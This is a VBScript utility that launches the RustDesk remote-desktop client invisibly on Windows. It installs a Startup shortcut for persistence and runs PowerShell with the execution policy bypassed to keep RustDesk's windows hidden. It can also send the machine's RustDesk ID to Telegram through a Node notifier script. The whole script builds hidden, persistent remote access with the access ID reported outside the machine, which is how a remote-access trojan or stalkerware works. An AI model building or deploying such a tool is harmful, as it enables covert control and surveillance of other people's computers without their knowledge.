' silent.vbs - start RustDesk hidden, keep its windows hidden, optionally report the ID to Telegram
' usage:  wscript tools\silent.vbs            - start now
'         wscript tools\silent.vbs install    - add a Startup shortcut
'         wscript tools\silent.vbs remove     - delete the Startup shortcut
Option Explicit
Dim sh, fso, dir, root, arg, startup, lnk, exePath, exeDir, q, cmd, nodeExe, notifier

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
dir = fso.GetParentFolderName(WScript.ScriptFullName)
root = fso.GetParentFolderName(dir)
q = Chr(34)

If WScript.Arguments.Count > 0 Then arg = LCase(WScript.Arguments(0))

If arg = "install" Then
  startup = sh.SpecialFolders("Startup")
  Set lnk = sh.CreateShortcut(startup & "\rustdesk-silent.lnk")
  lnk.TargetPath = "wscript.exe"
  lnk.Arguments = q & WScript.ScriptFullName & q
  lnk.WorkingDirectory = root
  lnk.WindowStyle = 7
  lnk.Description = "RustDesk hidden start"
  lnk.Save
  WScript.Echo "OK: " & startup & "\rustdesk-silent.lnk"
  WScript.Quit 0
End If

If arg = "remove" Then
  startup = sh.SpecialFolders("Startup")
  If fso.FileExists(startup & "\rustdesk-silent.lnk") Then fso.DeleteFile startup & "\rustdesk-silent.lnk", True
  WScript.Echo "OK: removed"
  WScript.Quit 0
End If

Log1 "start"

' 1) watchdog first: hides RustDesk windows and kills the portable-service helper,
'    whose broken cursor thread makes the remote pointer blink on Windows 7
'    (see docs/cursor-fix.md)
If fso.FileExists(dir & "\hide-watch.ps1") Then
  cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " & q & dir & "\hide-watch.ps1" & q
  sh.Run cmd, 0, False
  Log1 "watchdog started"
End If

' 2) RustDesk minimized, never a second copy
If IsRunning("rustdesk.exe") Then
  Log1 "rustdesk already running"
Else
  exePath = FindExe()
  If exePath = "" Then
    Log1 "ERROR: rustdesk exe not found, put rustdesk-*-x86_64.exe into " & root
    WScript.Quit 1
  End If
  exeDir = fso.GetParentFolderName(exePath)
  Log1 "exe: " & exePath
  sh.CurrentDirectory = exeDir
  sh.Run q & exePath & q, 7, False
  Log1 "rustdesk started"
End If

' 3) hide the window once it is up
WScript.Sleep 9000
If fso.FileExists(root & "\hide.ps1") Then
  cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " & q & root & "\hide.ps1" & q
  sh.Run cmd, 0, True
  Log1 "window hidden"
End If

' 4) optional Telegram message with the ID: needs tg.json and a node runtime
notifier = root & "\notify\idnotify.js"
If fso.FileExists(root & "\tg.json") And fso.FileExists(notifier) Then
  nodeExe = root & "\node.exe"
  If Not fso.FileExists(nodeExe) Then nodeExe = "node.exe"
  sh.CurrentDirectory = root
  sh.Run q & nodeExe & q & " " & q & notifier & q, 0, False
  Log1 "notifier started"
End If

Log1 "end"

Function FindExe()
  Dim f, n, p
  FindExe = ""
  p = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\rustdesk\rustdesk.exe"
  If fso.FileExists(p) Then
    FindExe = p
    Exit Function
  End If
  For Each f In fso.GetFolder(root).Files
    n = LCase(f.Name)
    If Left(n, 8) = "rustdesk" And Right(n, 4) = ".exe" And InStr(n, "-x86") > 0 Then
      FindExe = f.Path
      Exit Function
    End If
  Next
End Function

Function IsRunning(exeName)
  Dim wmi, list
  IsRunning = False
  On Error Resume Next
  Set wmi = GetObject("winmgmts:\\.\root\cimv2")
  Set list = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='" & exeName & "'")
  If list.Count > 0 Then IsRunning = True
  On Error GoTo 0
End Function

Sub Log1(s)
  Dim f
  On Error Resume Next
  Set f = fso.OpenTextFile(root & "\last.log", 8, True)
  f.WriteLine "=== " & Now & " " & s
  f.Close
  On Error GoTo 0
End Sub
